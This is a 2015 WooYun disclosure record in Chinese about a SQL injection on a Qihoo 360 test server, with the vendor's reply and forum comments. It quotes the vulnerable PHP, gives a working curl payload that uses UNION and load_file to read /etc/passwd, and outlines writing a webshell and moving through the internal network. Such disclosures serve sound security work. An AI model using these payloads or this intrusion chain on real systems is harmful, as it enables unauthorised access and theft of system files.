{"id": 7446, "wybug_id": "wooyun-2015-0122949", "wybug_title": "神器而已之奇虎360某站GETSHELL内网漫游到webscan了", "wybug_corp": "奇虎360", "wybug_author": "举起手来", "wybug_date": "2015-06-26 16:47", "wybug_open_date": "2015-08-10 18:10", "wybug_type": "成功的入侵事件", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["渗透测试思路"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-10：\t细节向公众公开  简要描述： 一个小问题导致的，这次不去吃饭了。漫游完再吃。妈蛋！ 详细说明：  首先是这样一个问题：http://220.181.150.107/web.tgz一看就是源码啊，下下来审计一下；我猜有注入：➜  web  cat web_function.php \n<?php$dir = dirname(__FILE__).'/';require_once($dir.\"../db/db_function.php\");function verifyed($short_code, $token){\t$state = NULL;\t$pdo = connect2db();\tif($pdo == NULL )\t\treturn 1;\t$sql = sprintf(\"select * from receiver_reference_count where rev_jid='%s' and short_code='%s'\", $token, $short_code);\t//echo \"sql:\".$sql.\"\\n\";\t$result = $pdo->query($sql);\tif($result === NULL )\t\treturn 2;\tforeach($result as $row)\t{\t\t$state = $row['state'];\t}\t//echo \" state: \".$state;\tif($state === NULL || $state  === '' )\t\treturn 3;\telse if($state == '0')\t\treturn 4;    return 0;}function get_nickname_by_short_code($short_code){\t$jid = NULL;\t$data = NULL;\t$nickname = '';\t$pdo = connect2db();\tif($pdo == NULL )\t\treturn 1;\t$sql = sprintf(\"select jid from short_hash_jid where short_hash = '%s'\", $short_code);\t//echo \"sql:\".$sql.\"\\n\";\t$result = $pdo->query($sql);\tif($result === NULL )\t\treturn 2;\tforeach($result as $row)\t{\t\t$jid = $row['jid'];\t}\t//echo \" state: \".$state;\tif($jid === NULL || $jid  === '' )\t\treturn 3;\t$result = '';\t$sql = sprintf(\"select name from ofUser where username='%s'\", $jid);\t//echo \"sql:\".$sql.\"\\n\";\t$result = $pdo->query($sql);\tif($result === NULL )\t\treturn 4;\tforeach($result as $row)\t{\t\t$nickname = $row['name'];\t}\t//echo \"name: \".$nickname.PHP_EOL;    $data = array('jid'=>$jid, 'nickname'=>$nickname);\treturn $data;}function get_play_time_by_short_code( $short_code ){\t$time = 5;\t$pdo = connect2db();\tif($pdo == NULL )\t\treturn $time;\t$sql = sprintf(\"select play_time from short_hash_jid where short_hash='%s'\", $short_code);\t//echo \"sql:\".$sql.\"\\n\";\t$result = $pdo->query($sql);\tif($result === NULL )\t\treturn $time;\tforeach($result as $row)\t{\t\t$time = $row['play_time'];\t\t//echo \"time:\".$time.PHP_EOL;\t}\tif($time === NULL || $time  === '' || $time === '0')\t\t$time = 5;    return $time;}//echo verifyed('bXhRdzQWj1JYDmos',\"13438299142\" );/*$data = get_nickname_by_short_code(\"1dhg05myYabJI5CO\");if( !is_int($data)){\tprint_r($data);}else{\techo $data.PHP_EOL;}*///echo get_play_time_by_short_code(\"QgHUkVoFE7mhSD9P\");?>\n一看就是注入，但是按逻辑走着，入口在get.php\n<?php$dir = dirname(__FILE__).'/';require_once($dir.\"../libs/util.php\");require_once(\"gen_html.php\");require_once(\"web_function.php\");if (isset($_COOKIE[\"token\"])){\t$token = $_COOKIE[\"token\"];}//print_r($_COOKIE);$query_str = isset($_SERVER['QUERY_STRING']) ? getParams($_SERVER['QUERY_STRING']) : '';//echo \"query_str: \".$query_str.\"<br>\";parse_str($query_str, $tmpArr);//print_r($tmpArr);if(isset($tmpArr['s'])){\t$short_code = $tmpArr['s'];}//echo \"short_code: \".$short_code.\"<br>\";//print_r($_POST);////////////////////////////////////////////////////////////////for Jump the page$mobile = $_POST['mobile'];$post_code = $_POST['code'];if ($mobile != ''){//\techo \"short_code=\".$post_code.\"mobile=\".$mobile;\t$ret = verifyed($post_code, $mobile);//\techo \"ret == \".$ret;\tif ($ret == 0)\t{\t\tsetcookie(\"token\", $mobile, time()+3600, \"/\", null);\t    response_picture_html($post_code, $mobile, $dir);\t    exit();\t}\tif ($ret == 4)\t{\t\tsetcookie(\"token\", $mobile, time()+3600, \"/\", null);\t    response_ad_html($dir, $post_code);\t    exit();\t}\tresponse_verify_html($post_code, $dir);\texit();}////////////////////////////////////////////////////////////////print_r($_COOKIE);$ret = verifyed($short_code, $token);if ($ret == 0 ){\tsetcookie(\"token\", $token, time()+3600, \"/\", null);\tresponse_picture_html($short_code, $token, $dir);\texit();}if($ret == 4){    response_ad_html($dir, $short_code);    exit();}\tresponse_verify_html($short_code, $dir);\texit();?>\n配合这个文件\n➜  web  cat gen_html.php <?php    $dir = dirname(__FILE__).'/';    require_once(\"../libs/SmartyTemplate.php\");    require_once(\"../libs/util.php\");    require_once(\"web_function.php\");    function response_verify_html($code, $dir)    {        $tpl =  'template/verify.html.tpl';        $objSmarty = SmartyTemplate::getInstance();        $file_tpl = $dir.$tpl;        $objSmarty->assign('short_code',$code);\t\t$url = \"http://220.181.150.107/\".$code.\".htl\";        $objSmarty->assign('thumb_src',$url);        @header('Conten-Type: text/html');        //@header('Cache-Control: no-cache, no-store, max-age=0');        @header('Cache-Control: no-cache, no-store');        @header('Pragma: no-cache');        @header('Expires: -1');        returnData(RESPONSE_OK, 'OK', $objSmarty->fetch($file_tpl));    }    function response_picture_html($code, $token, $dir)    {        $tpl =  'template/picture.html.tpl';\t\t$finish_url = \"http://220.181.150.107/\".$code;\t\t$counter = get_play_time_by_short_code($code);        $objSmarty = SmartyTemplate::getInstance();        $file_tpl = $dir.$tpl;\t\t$url = \"http://220.181.150.107/\".$code.\".htl?jid=\".$token.\"&type=normal\";        $objSmarty->assign('img_url',$url);        $objSmarty->assign('counter',$counter);        $objSmarty->assign('finish_url',$finish_url);        @header('Conten-Type: text/html');        //@header('Cache-Control: no-cache, no-store, max-age=0');        @header('Cache-Control: no-cache, no-store');        @header('Pragma: no-cache');        @header('Expires: -1');        //writeLog($file_tpl.\"  why22222222222222\", __FILE__, __LINE__, DOWNLOAD_RUN_LOG);        returnData(RESPONSE_OK, 'OK', $objSmarty->fetch($file_tpl));    }    function response_ad_html($dir, $short_code)    {        $tpl =  'template/ad.html.tpl';        $nickname = '';\t\t$jid = '';\t\t\t\t$data = get_nickname_by_short_code($short_code); \t\tif( !is_int($data) )\t\t{\t\t\t$jid = $data['jid'];\t\t\t$nickname = $data['nickname'];\t\t\t//print_r($data);\t\t}        $objSmarty = SmartyTemplate::getInstance();\t\t//echo \"nickname: \".$nickname.\" jid: \".$jid.\"<br>\";        $file_tpl = $dir.$tpl;        $objSmarty->assign('nickname',$nickname);        $objSmarty->assign('jid',$jid);        @header('Conten-Type: text/html');        //@header('Cache-Control: no-cache, no-store, max-age=0');        @header('Cache-Control: no-cache, no-store');        @header('Pragma: no-cache');        @header('Expires: -1');        returnData(RESPONSE_OK, 'OK', $objSmarty->fetch($file_tpl));    }?>\n最后得到这样一个注入点；\ncurl http://220.181.150.107/web/get.php -d \"mobile=13438299142' or 1=2 union select 2222222222222,1111111,0 limit 1 -- ;&code=1'  union select load_file('/etc/passwd') -- ;\"\n接下来，sql注入写文件，拿shell\n\n内网漫游之偶遇webscan.360.cn\n\n\n\n   漏洞证明：  就这样吧，点到为止，shell已删。   修复方案：  然并卵！   版权声明：转载请注明来源 举起手来@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-06-26 18:09 厂商回复： 感谢您的反馈，这是台近期准备下线的测试服务器，目前我们已做下线处理。 最新状态： 2015-06-26：确认测试文件存在SQL注入漏洞，成功利用后可以探测所在IDC机房的部分机器，再次对白帽子表示感谢！  ", "replys": "漏洞评价：\n评论\n     2015-06-26 16:49 |    \t\tf4ck \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:7        | 有些人很牛B，一个漏洞能刷成N个。)\t\t \n  呵呵，360    \n     2015-06-26 16:49 |    \t\tboooooom  \t\t\t( 普通白帽子  |\t\t\t        Rank:467 漏洞数:50        | 我有一个好想法！)\t\t \n  呵呵，360    \n     2015-06-26 16:49 |    \t\t啊L川 \t\t\t( 普通白帽子  |\t\t\t        Rank:195 漏洞数:39        | 菜鸟 ，菜渣， 菜呀！)\t\t \n  呵呵，360    \n     2015-06-26 16:49 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  我了擦！！！    \n     2015-06-26 16:50 |    \t\t淡漠天空  \t\t\t( 实习白帽子  |\t\t\t        Rank:1113 漏洞数:142        | M:出售GOV  STATE NSA CIA NASA DHS Symant...)\t\t \n  呵呵，360    \n     2015-06-26 16:51 |    \t\t天地不仁 以万物为刍狗 \t\t\t( 普通白帽子  |\t\t\t        Rank:977 漏洞数:264        | 天地本不仁 万物为刍狗)\t\t \n  低  5分  此问题已由其他渠道获知  感谢您的提交      \n     2015-06-26 16:51 |    \t\tnull_z \t\t\t( 普通白帽子  |\t\t\t        Rank:251 漏洞数:30        )\t\t \n  56rank拿好    \n     2015-06-26 16:51 |    \t\tmango \t\t\t( 核心白帽子 |\t\t\t        Rank:1668 漏洞数:248        | 我有个2b女友！)\t\t \n  我了擦！！！     \n     2015-06-26 16:51 |    \t\tkobin97  \t\t\t( 核心白帽子 |\t\t\t        Rank:1754 漏洞数:190        | 关注网络安全。。)\t\t \n  呵呵，360     \n     2015-06-26 16:54 |    \t\tGhost丶与狼共舞 \t\t\t( 实习白帽子  |\t\t\t        Rank:69 漏洞数:20        | 游走在天堂与地狱的幽灵丶在黯淡的世界里谱...)\t\t \n  呵呵，360    \n     2015-06-26 16:54 |    \t\t小不点 \t\t\t( 普通白帽子  |\t\t\t        Rank:751 漏洞数:78        | 生命不息，刷洞不止.....)\t\t \n  应该不会把，上次一个弱口令还给了7呢    \n     2015-06-26 16:55 |    \t\t0x 80 \t\t\t( 普通白帽子  |\t\t\t        Rank:1301 漏洞数:398        | 某安全公司招聘系统运维、渗透测试、安全运...)\t\t \n  围观    \n     2015-06-26 16:55 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  呵呵，360    \n     2015-06-26 16:57 |    \t\thkAssassin \t\t\t( 普通白帽子  |\t\t\t        Rank:358 漏洞数:66        | 我是一只毛毛虫。)\t\t \n  呵呵，360    \n     2015-06-26 17:00 |    \t\t我是壮丁  \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 专业打酱油)\t\t \n  呵呵，360    \n     2015-06-26 17:00 |    \t\tJumbo \t\t\t( 普通白帽子  |\t\t\t        Rank:111 漏洞数:29        | 猫 - http://www.chinabaiker.com)\t\t \n  ................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................    \n     2015-06-26 17:01 |    \t\tmango \t\t\t( 核心白帽子 |\t\t\t        Rank:1668 漏洞数:248        | 我有个2b女友！)\t\t \n  着漏洞发SRC起码3W    \n     2015-06-26 17:04 |    \t\tM4sk \t\t\t( 普通白帽子  |\t\t\t        Rank:1199 漏洞数:319        | 国内信息安全任重而道远，还需要厂商和白帽...)\t\t \n  666666    \n     2015-06-26 17:04 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  求神器！    \n     2015-06-26 17:08 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  叼叼    \n     2015-06-26 17:09 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  360 啪啪!    \n     2015-06-26 17:10 |    \t\t动后河 \t\t\t( 实习白帽子  |\t\t\t        Rank:51 漏洞数:13        | ☭)\t\t \n  关注    \n     2015-06-26 17:10 |    \t\tJunkman \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | 菜鸟一枚，求成长。)\t\t \n  360个Rank值，少侠请收好。    \n     2015-06-26 17:10 |    \t\the1renyagao \t\t\t( 普通白帽子  |\t\t\t        Rank:225 漏洞数:29        | 是金子总会发光，在还未发光之前，先打磨打...)\t\t \n  前排买瓜子    \n     2015-06-26 17:13 |    \t\tqdq \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 有关部门)\t\t \n  这漏洞提交到补天不得拿2W块钱？    \n     2015-06-26 17:15 |    \t\t❤ \t\t\t( 普通白帽子  |\t\t\t        Rank:276 漏洞数:69        | ❤)\t\t \n  mark    \n     2015-06-26 17:18 |    \t\twy007 \t\t\t( 实习白帽子  |\t\t\t        Rank:95 漏洞数:10        | 其实我是一名卧底...)\t\t \n  坐等公开！    \n     2015-06-26 17:23 |    \t\t夜鸥 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 我所知道的，和你差不多，我所感受到的，和...)\t\t \n  360个Rank必须有    \n     2015-06-26 17:26 |    \t\tchopper \t\t\t( 普通白帽子  |\t\t\t        Rank:144 漏洞数:29        | 菜鸟求学，多多关照~)\t\t \n  赶紧0day都存起来，然后求共享    \n     2015-06-26 17:39 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:64        )\t\t \n  23333    \n     2015-06-26 17:44 |    \t\t肉肉  \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:10        | 肉肉在长亭科技，肉肉在长亭科技，肉肉在长...)\t\t \n  我就看看    \n     2015-06-26 17:48 |    \t\tmickey \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 此号多人用，发表任何信息不代表本人观点)\t\t \n  表示并非搞定了webscan    \n     2015-06-26 17:49 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  楼主的名字亮了    \n     2015-06-26 17:50 |    \t\tRazor2012 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:3        | 不会渗透的自动化测试工程师不是好厨师)\t\t \n  5rank 少侠拿好！    \n     2015-06-26 18:18 |    \t\t心伤的胖子 \t\t\t( 普通白帽子  |\t\t\t        Rank:308 漏洞数:29        | 因为心伤，所以胖子。)\t\t \n  不知道在补天的话是不是标题都看不到？    \n     2015-06-26 18:29 |    \t\t90Snake \t\t\t( 普通白帽子  |\t\t\t        Rank:109 漏洞数:42        | 最大的漏洞就是人)\t\t \n  奇虎360 举起手来    \n     2015-06-26 19:05 |    \t\tHoliday0 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:8        | Green hand.)\t\t \n  标题党，这也叫漫游内网？    \n     2015-06-26 19:52 |    \t\tJinone \t\t\t( 普通白帽子  |\t\t\t        Rank:128 漏洞数:28        | 安全盒子招人ing             有意请私信)\t\t \n  40rank到手   洞主爽了    \n     2015-06-26 23:02 |    \t\tblack4yl \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | WoHoo !)\t\t \n  呵呵，360！ 部分！    \n     2015-06-26 23:09 |    \t\tV-King \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:7        | 我是静静)\t\t \n  mark    \n     2015-06-26 23:13 |    \t\tCoffee \t\t\t( 普通白帽子  |\t\t\t        Rank:144 漏洞数:15        | Corie, a student of RDFZ.)\t\t \n  漫游360了~威武！    \n     2015-06-27 01:37 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  nb!    \n     2015-06-27 10:10 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  一说漏洞就说要下线的服务器 呵呵    \n     2015-06-27 23:19 |    \t\t小海 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 疯狂闯天下)\t\t \n  @举起手来  兄弟有点刚啊，，再吃完饭就要下线了    \n     2015-06-29 12:12 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  2015-06-26：确认测试文件存在SQL注入漏洞，成功利用后可以探测所在IDC机房的部分机器，再次对白帽子表示感谢！   给力哦    \n     2015-07-08 12:06 |    \t\t残废 \t\t\t( 普通白帽子  |\t\t\t        Rank:179 漏洞数:40        | 我是残废，啦啦啦啦)\t\t \n  呵呵，360！    \n     2015-07-08 12:08 |    \t\tBlackeagle \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:10        | 向WooYun致敬)\t\t \n  【说个事实】360的响应时间、处理时间、以及rank发放都不错啊。    \n     2015-07-08 12:36 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  这个是有点标题党了，看不到漫游是什么情况？    \n     2015-07-08 13:08 |    \t\tdarker \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:26        | = =)\t\t \n  @phith0n 哈哈～    \n     2015-07-08 14:58 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @phith0n 哈别太在意    \n     2015-07-12 03:08 |    \t\tblack hook \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:8        | 新人、)\t\t \n  标题党太严重了，为啥不处理？看来乌云眼里也容不下竞业公司哈哈    \n     2015-07-12 11:03 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  少侠 路径怎么得到的    \n     2015-07-16 18:19 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  ...    \n     2015-07-16 19:09 |    \t\t黑暗游侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:1780 漏洞数:268        | 123)\t\t \n  我好久之前发的评论没了，我发的是神器就是curl，估计泄露信息被删了。。    \n     2015-07-31 18:37 |    \t\t爱梅小礼 \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:16        | 我怀念的是无话不说)\t\t \n  只是一个sql注入而已，找不到亮点，怎么还就打雷了？    \n     2015-08-10 18:40 |    \t\tBusliv \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:16        | to be，and to be)\t\t \n  大概猜到这神器怎么写的了，    \n     2015-08-10 20:24 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  举起手来。这辈子可能就一次这种机会吧    \n     2015-08-11 09:07 |    \t\t破晓_Vampire \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | Communication technology)\t\t \n  呵呵 360    \n     2015-08-11 10:48 |    \t\t路人毛 \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:10        | 昨晚做梦，挖到了电信都漏洞，被电信起诉了...)\t\t \n  我也去360碰运气去了    \n     2015-08-13 22:08 |    \t\t风炫 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:5        | 菊花残，满地伤)\t\t \n  打脸    \n     2015-08-15 20:52 |    \t\tLonely \t\t\t( 实习白帽子  |\t\t\t        Rank:72 漏洞数:27        | 人生如梦,始终都游不过当局者迷的悲哀。)\t\t \n  感谢您的反馈，这是台近期准备下线的测试服务器，目前我们已做下线处理。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}